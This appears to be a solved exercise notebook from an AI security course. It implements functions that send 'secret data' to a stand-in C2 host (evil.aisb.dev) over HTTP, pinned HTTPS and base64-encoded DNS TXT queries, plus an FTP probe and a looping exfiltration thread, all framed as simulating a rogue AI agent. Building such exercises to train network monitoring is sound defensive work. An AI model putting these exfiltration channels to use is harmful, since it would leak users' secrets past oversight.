# %%
import os
import base64
import time

from typing import Optional, Dict, Any
from unittest.mock import patch, MagicMock
import requests


def make_evil_request(secret_data: str) -> Optional[str]:
    """
    Send a GET request to evil.aisb.dev with secret data.

    This simulates an AI agent attempting to communicate with an external C2 server.
    The secret data is sent as a query parameter.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails or throws
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
    #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
    #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
    #   2. Return the response text if successful (status 200), None otherwise

    # response = requests.get(f'http://evil.aisb.dev/exfiltrate?data={secret_data}', timeout=5)
    try:
        response = requests.get("http://evil.aisb.dev/exfiltrate", params={"data": secret_data}, timeout=5)
    except requests.exceptions.ConnectionError:
        return None

    if response.status_code != 200:
        return None
    else:
        return response.text


from w1d2_test import test_make_evil_request

test_make_evil_request(make_evil_request)

exfiltrate_data = make_evil_request


# %%
def make_evil_request_https(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS to evil.aisb.dev with secret data.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    try:
        response = requests.get("https://evil.aisb.dev/exfiltrate", params={"data": secret_data}, timeout=5)
    except requests.exceptions.ConnectionError:
        return None

    if response.status_code != 200:
        return None
    else:
        return response.text


from w1d2_test import test_make_evil_request_https

test_make_evil_request_https(make_evil_request_https)


# Update the exfiltrate_data function to use HTTPS
exfiltrate_data = make_evil_request_https


# %%
def make_evil_request_pinned(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS with certificate pinning to evil.aisb.dev.

    This function uses certificate pinning to ensure we're talking to the real
    evil.aisb.dev server, not a MITM proxy with a self-signed certificate.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    try:
        response = requests.get(
            "https://evil.aisb.dev/exfiltrate",
            params={"data": secret_data},
            timeout=5,
            verify="isrg-root-x1.pem",
        )
    except requests.exceptions.ConnectionError as e:
        print(e)
        return None
    except FileNotFoundError:
        print("File not found")
        return None

    if response.status_code != 200:
        return None
    else:
        return response.text


from w1d2_test import test_make_evil_request_pinned

test_make_evil_request_pinned(make_evil_request_pinned)

exfiltrate_data = make_evil_request_pinned

# %%
import ftplib


def make_evil_request_ftp(secret_data: str) -> Optional[str]:
    """
    Send a request over FTP to ftp.scene.org with secret data.

    This simulates an AI agent attempting to exfiltrate data using a non-HTTP protocol.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    # TODO: Implement the function to:
    #   1. Connect to ftp.scene.org using the ftplib library
    #   2. Read some data (e.g., list files in the root directory)
    #   3. Return the response text if successful, None otherwise

    try:
        ftp = ftplib.FTP("ftp.scene.org", timeout=5)
        ftp.login()

        dir_list = ftp.nlst()
        ftp.quit()
        return str(dir_list)
    except Exception as e:
        print(e)
        return None


from w1d2_test import test_make_evil_request_ftp

test_make_evil_request_ftp(make_evil_request_ftp)

exfiltrate_data = make_evil_request_ftp


# %%
import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns

resolver = dns_resolver.Resolver()
resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]


def make_evil_request_dns(secret_data: str) -> Optional[str]:
    """
    Send a DNS request to evil.aisb.dev to exfiltrate secret data.

    This simulates an AI agent attempting to communicate using DNS queries.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the DNS query, or None if the request fails
    """
    # TODO: Implement the function to:
    #   1. Construct a domain like secret_data.evil.aisb.dev (remember to encode secret_data with base64.urlsafe_b64encode)
    #   2. Perform a DNS query for TXT records using resolver.resolve
    #   3. Return the first TXT record found, or None if no records are found
    try:
        prefix = base64.urlsafe_b64encode(secret_data.encode()).decode()
        url = f"{prefix}.evil.aisb.dev"
        records = resolver.resolve(url, "TXT")
        if len(records) > 0:
            return records[0].to_text()
    except dns_resolver.NXDOMAIN:
        print("Domain does not exist")
        return None
    except dns_resolver.NoAnswer:
        print("No answer recieved")
        return None
    except Exception:
        print("DNS request failed.")
        return None


from w1d2_test import test_make_evil_request_dns

test_make_evil_request_dns(make_evil_request_dns, resolver)

# Set the exfiltration function for use in the exercise
exfiltrate_data = make_evil_request_dns

if __name__ == "__main__":  # Only executed when running the script directly
    """
    Make requests to the evil server with different secret data.
    This simulates an AI agent repeatedly trying to exfiltrate data.
    """

    def loop_exfiltration():
        while True:
            global exfiltrate_data
            try:
                time.sleep(5)
                print(exfiltrate_data("some_secret_data"))
            except KeyboardInterrupt:
                print("Stopping exfiltration loop.")
                break

    import threading

    thread = threading.Thread(target=loop_exfiltration)
    thread.start()

# %%
